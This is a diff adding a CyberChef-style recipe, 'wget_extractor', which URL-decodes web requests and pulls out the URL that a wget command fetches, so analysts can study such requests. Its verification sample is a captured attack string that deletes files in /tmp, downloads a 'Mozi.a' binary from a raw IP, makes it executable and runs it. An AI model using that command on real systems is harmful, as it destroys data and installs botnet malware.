@@ -1,0 +1,16 @@
+{
+    "recipe": [
+        {"op": "URL Decode","args": []},
+        {"op": "Regular expression","args": ["User defined","wget ?([^ ;]+)",true,true,false,false,false,false,"List capture groups"]}
+    ],
+    "name": "wget_extractor",
+    "meta": {
+        "author": "CrazyDave",
+        "date": "2020-02-12T18:38:36.013Z",
+        "description": "extracts the target of a wget"
+    },
+    "verify": {
+        "originalInput": "173.53.90.242:80/shell?cd+/tmp;rm+-rf+*;wget+http://111.42.103.58:42043/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws",
+        "expectedOutput": "http://111.42.103.58:42043/Mozi.a"
+    }
+}
